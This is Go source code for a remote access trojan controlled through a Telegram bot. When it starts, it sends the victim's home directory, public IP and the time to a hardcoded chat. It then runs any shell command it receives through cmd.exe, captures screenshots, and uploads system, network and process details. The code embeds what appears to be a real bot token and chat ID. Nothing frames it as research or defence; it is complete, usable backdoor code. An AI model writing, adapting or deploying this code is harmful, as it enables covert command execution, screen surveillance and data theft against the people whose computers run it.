package main

import (
    "fmt"
    "image/png"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "time"

    tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
    "github.com/kbinani/screenshot"
    "github.com/shirou/gopsutil/cpu"
    "github.com/shirou/gopsutil/disk"
    "github.com/shirou/gopsutil/host"
    "github.com/shirou/gopsutil/mem"
    "github.com/shirou/gopsutil/net"
    "github.com/shirou/gopsutil/process"
)

const (
    BOT_TOKEN     = "7727386095:AAGVE3OsgVvAEEeZlFe6j5VK9ej4YMd9qm8"
    STARTUP_CHAT  = 5441972884
    IMG_DIR       = "imgdat"
    MAX_MSG_BYTES = 4096
)

var cwd string

func init() {
    var err error
    cwd, err = os.Getwd()
    if err != nil {
        log.Fatalf("Failed to get cwd: %v", err)
    }
    os.MkdirAll(IMG_DIR, 0755)
}

func captureScreen() (string, string, error) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        return "", "", err
    }
    ts := time.Now().Format("20060102150405")
    fileName := fmt.Sprintf("%s.png", ts)
    fullPath := filepath.Join(IMG_DIR, fileName)
    f, err := os.Create(fullPath)
    if err != nil {
        return "", "", err
    }
    defer f.Close()
    png.Encode(f, img)
    return fullPath, fileName, nil
}

func getOSInfo() string {
    pi, _ := host.Info()
    return fmt.Sprintf("[+] OS Version: %s %s", pi.Platform, pi.PlatformVersion)
}

func getSystemInfo() string {
    hi, _ := host.Info()
    return fmt.Sprintf("\n==== SYSTEM INFO ====\n[+] Hostname: %s\n    Uptime: %d seconds",
        hi.Hostname, hi.Uptime)
}

func getCPUInfo() string {
    infos, _ := cpu.Info()
    perc, _ := cpu.Percent(time.Second, true)
    sb := strings.Builder{}
    sb.WriteString("\n==== CPU INFO ====")
    if len(infos) > 0 {
        sb.WriteString(fmt.Sprintf("\n[+] Model: %s", infos[0].ModelName))
    }
    for i, p := range perc {
        sb.WriteString(fmt.Sprintf("\n    Core %d: %.2f%%", i, p))
    }
    return sb.String()
}

func getRAMInfo() string {
    v, _ := mem.VirtualMemory()
    return fmt.Sprintf("\n==== RAM INFO ====\n[+] Total: %v MB\n    Used: %v MB (%.2f%%)",
        v.Total/1024/1024, v.Used/1024/1024, v.UsedPercent)
}

func getDiskInfo() string {
    parts, _ := disk.Partitions(false)
    sb := strings.Builder{}
    sb.WriteString("\n==== DISK INFO ====")
    for _, p := range parts {
        u, err := disk.Usage(p.Mountpoint)
        if err != nil {
            continue
        }
        sb.WriteString(fmt.Sprintf("\n[+] %s: %.2f/%.2f GB (%.2f%%)",
            p.Device, float64(u.Used)/1e9, float64(u.Total)/1e9, u.UsedPercent))
    }
    return sb.String()
}

func getNetworkInfo() string {
    ifaces, _ := net.Interfaces()
    sb := strings.Builder{}
    sb.WriteString("\n==== NETWORK INFO ====")
    for _, iface := range ifaces {
        sb.WriteString(fmt.Sprintf("\n[+] %s", iface.Name))
        for _, addr := range iface.Addrs {
            sb.WriteString(fmt.Sprintf("\n    %s", addr.Addr))
        }
    }
    resp, err := http.Get("https://api.ipify.org")
    if err == nil {
        body, _ := ioutil.ReadAll(resp.Body)
        sb.WriteString(fmt.Sprintf("\n[+] Public IP: %s", string(body)))
        resp.Body.Close()
    } else {
        sb.WriteString("\n[!] Failed to fetch public IP")
    }
    return sb.String()
}

func getBatteryInfo() string {
    return "\n==== BATTERY INFO ====\n[!] Not supported on Windows"
}

func getTemperatureInfo() string {
    return "\n==== TEMPERATURE INFO ====\n[!] Not supported on Windows"
}

func getProcessInfo() string {
    ps, _ := process.Processes()
    sb := strings.Builder{}
    sb.WriteString("\n==== PROCESS INFO ====")
    for _, p := range ps {
        name, _ := p.Name()
        cpuP, _ := p.CPUPercent()
        memP, _ := p.MemoryPercent()
        sb.WriteString(fmt.Sprintf("\n[+] PID:%d %s CPU:%.2f%% MEM:%.2f%%",
            p.Pid, name, cpuP, memP))
    }
    return sb.String()
}

func getAllSystemInfo() string {
    return getOSInfo() +
        getSystemInfo() +
        getCPUInfo() +
        getRAMInfo() +
        getDiskInfo() +
        getNetworkInfo() +
        getBatteryInfo() +
        getTemperatureInfo() +
        getProcessInfo()
}

func sendLargeMessage(bot *tgbotapi.BotAPI, chatID int64, text string) {
    for i := 0; i < len(text); i += MAX_MSG_BYTES {
        end := i + MAX_MSG_BYTES
        if end > len(text) {
            end = len(text)
        }
        bot.Send(tgbotapi.NewMessage(chatID, text[i:end]))
    }
}

func main() {
    log.Println("Starting bot...")
    bot, err := tgbotapi.NewBotAPI(BOT_TOKEN)
    if err != nil {
        log.Fatalf("Bot init failed: %v", err)
    }

    // clear any webhook so polling works
    _, err = bot.Request(tgbotapi.DeleteWebhookConfig{})
    if err != nil {
        log.Printf("⚠️ could not delete webhook: %v", err)
    }

    // send startup info
    user, _ := os.UserHomeDir()
    resp, err := http.Get("https://api.ipify.org?format=text")
    ip := "No IP"
    if err == nil {
        b, _ := ioutil.ReadAll(resp.Body)
        ip = string(b)
        resp.Body.Close()
    }
    now := time.Now().Format("Jan 02, 2006 03:04:05 PM")
    bot.Send(tgbotapi.NewMessage(STARTUP_CHAT, fmt.Sprintf("%s %s %s", user, ip, now)))

    updates := bot.GetUpdatesChan(tgbotapi.NewUpdate(0))

    for update := range updates {
        if update.Message == nil {
            continue
        }
        txt := strings.TrimSpace(update.Message.Text)
        cid := update.Message.Chat.ID

        switch {
        case txt == "/start":
            bot.Send(tgbotapi.NewMessage(cid, "Hey there! I'm your Go bot. Type /help."))
        case txt == "/help":
            bot.Send(tgbotapi.NewMessage(cid, "Commands:\n/help\n/scrcap\n/info\ncmd <command>"))
        case strings.HasPrefix(txt, "cmd "):
            cmdStr := strings.TrimSpace(txt[4:])
            if strings.HasPrefix(cmdStr, "cd ") {
                path := strings.Trim(strings.TrimPrefix(cmdStr, "cd "), `"`)
                newPath := filepath.Join(cwd, path)
                if fi, err := os.Stat(newPath); err == nil && fi.IsDir() {
                    cwd = newPath
                    bot.Send(tgbotapi.NewMessage(cid, "Changed dir to "+cwd))
                } else {
                    bot.Send(tgbotapi.NewMessage(cid, "[-] Dir not found: "+path))
                }
            } else {
                // run via cmd.exe so built-ins like md/dir work
                cmd := exec.Command("cmd", "/C", cmdStr)
                cmd.Dir = cwd
                out, err := cmd.CombinedOutput()
                if err != nil {
                    sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
                } else {
                    sendLargeMessage(bot, cid, string(out))
                }
            }
        case txt == "info":
            sendLargeMessage(bot, cid, getAllSystemInfo())
        case txt == "scrcap":
            path, _, err := captureScreen()
            if err != nil {
                bot.Send(tgbotapi.NewMessage(cid, "[!] Screenshot failed: "+err.Error()))
                break
            }
            bot.Send(tgbotapi.NewPhoto(cid, tgbotapi.FilePath(path)))
        default:
            bot.Send(tgbotapi.NewMessage(cid, "I don't get that. Try /help"))
        }
    }
}
